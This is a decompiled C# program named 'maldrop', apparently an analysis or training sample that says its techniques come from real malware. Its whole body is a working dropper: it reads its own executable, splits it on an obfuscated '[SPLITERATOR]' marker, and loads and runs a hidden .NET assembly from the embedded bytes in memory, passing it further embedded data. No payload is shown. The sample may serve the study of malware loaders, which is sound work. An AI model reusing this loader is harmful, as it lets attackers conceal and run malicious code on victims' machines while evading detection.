// Decompiled with JetBrains decompiler
// Type: maldrop.Program
// Assembly: maldrop, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 5DDA886D-D0C8-4EAD-A702-21CBADD70CF6
// Assembly location: C:\Users\Manzel\Desktop\maldrop.exe

using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Text;

namespace maldrop
{
  internal static class Program
  {
    private static bool CompareOffset(byte[] arr, int off, byte[] pattern)
    {
      for (int index = 0; index < pattern.Length; ++index)
      {
        if ((int) arr[off + index] != (int) pattern[index])
          return false;
      }
      return true;
    }

    private static byte[][] SplitByteArray(byte[] arr, byte[] splitPattern)
    {
      int count = 0;
      List<byte[]> numArrayList = new List<byte[]>();
      for (int off = 0; off < arr.Length - splitPattern.Length; ++off)
      {
        if (Program.CompareOffset(arr, off, splitPattern))
        {
          numArrayList.Add(((IEnumerable<byte>) arr).Skip<byte>(count).Take<byte>(off - count).ToArray<byte>());
          count = off + splitPattern.Length;
          off += splitPattern.Length - 1;
        }
      }
      numArrayList.Add(((IEnumerable<byte>) arr).Skip<byte>(count).ToArray<byte>());
      return numArrayList.ToArray();
    }

    [STAThread]
    private static void Main(string[] args)
    {
      Console.WriteLine("All the techniques implemented in this were found in malware samples I analyzed");
      byte[][] numArray = Program.SplitByteArray(File.ReadAllBytes(Assembly.GetEntryAssembly().Location), Encoding.ASCII.GetBytes("[SPLIT" + "ERATOR]"));
      List<string> stringList = new List<string>();
      for (int index = 0; index < numArray[2].Length; ++index)
        stringList.Add(numArray[2][index].ToString());
      Assembly.Load(numArray[1]).EntryPoint.Invoke((object) null, new object[1]
      {
        (object) stringList.ToArray()
      });
    }
  }
}
